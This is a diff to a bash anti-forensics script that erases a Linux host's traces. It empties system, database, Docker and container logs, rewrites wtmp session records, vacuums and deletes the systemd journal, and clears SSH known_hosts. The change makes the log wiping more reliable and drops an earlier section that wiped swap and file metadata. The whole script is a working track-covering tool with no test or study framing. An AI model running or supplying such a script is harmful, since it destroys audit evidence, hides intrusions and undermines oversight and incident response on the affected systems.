@@ -30,17 +30,31 @@ log_files=(
     "/var/log/mysql.log" "/var/log/mysql/error.log"
     "/var/log/postgresql.log"
     
-    "/var/log/docker.log" "/var/log/containers/*.log"
+    "/var/log/docker.log"
     
     "/var/log/cloud-init.log" "/var/log/cloud-init-output.log"
 )
 
 for file in "${log_files[@]}"; do
-    if [ -f "$file" ] || [ -d "$file" ]; then
-        echo -e "\e[34m[*] Cleaning: $file\e[0m"
-        echo "" > "$file" 2>/dev/null || rm -rf "$file/*" 2>/dev/null
+    if [ -f "$file" ]; then
+        echo -e "\e[34m[*] Cleaning file: $file\e[0m"
+        : > "$file"
+    elif [ -d "$file" ]; then
+        echo -e "\e[34m[*] Cleaning directory contents: $file\e[0m"
+        rm -rf "$file"/* 2>/dev/null
+    else
+        echo -e "\e[33m[!] File or directory not found: $file\e[0m"
     fi
 done
+
+if [ -d "/var/log/containers" ]; then
+    for log in /var/log/containers/*.log; do
+        if [ -f "$log" ]; then
+            echo -e "\e[34m[*] Cleaning container log file: $log\e[0m"
+            : > "$log"
+        fi
+    done
+fi
 
 echo -e "\e[32m[+] Cleaning session records...\e[0m"
 utmpdump /var/log/wtmp > /tmp/wtmp.tmp && mv /tmp/wtmp.tmp /var/log/wtmp 2>/dev/null
@@ -59,11 +73,6 @@ if command -v journalctl &>/dev/null; then
     journalctl --vacuum-time=1s 2>/dev/null
     rm -rf /var/log/journal/* 2>/dev/null
 fi
-
-echo -e "\e[32m[+] Cleaning metadata and swap...\e[0m"
-find / -type f -exec setfattr -x user.* {} \; 2>/dev/null
-swapoff -a 2>/dev/null && dd if=/dev/zero of=/swapfile bs=1M 2>/dev/null
-mkswap /swapfile 2>/dev/null && swapon -a 2>/dev/null
 
 echo -e "\e[32m[+] Cleaning SSH traces...\e[0m"
 echo "" > ~/.ssh/known_hosts 2>/dev/null
